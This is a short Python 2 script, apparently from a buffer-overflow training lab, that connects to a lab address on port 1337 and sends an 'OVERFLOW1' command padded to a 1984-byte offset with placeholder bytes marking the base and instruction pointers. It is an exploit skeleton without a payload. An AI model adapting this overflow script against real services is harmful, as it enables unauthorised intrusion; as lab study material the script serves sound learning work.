#!/usr/bin/env python2
import socket

RHOST="10.10.160.66"
RPORT=1337

#want to keep total length the same in case program changes actions
buf_totlen = 3000
#from last thing
offset = 1984

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf="OVERFLOW1 "
buf+="A"*(offset - len(buf)) #probably not necessary to sub 0?
buf+= "BBBB" #base pointer
buf+= "CCCC" #instruction pointer
buf+= "D"*(buf_totlen - len(buf)) # keep size the same
buf+="\n"

s.send(buf)

print("Send: {0}".format(buf))

data=s.recv(1024)
print("Received: {}".format(data))

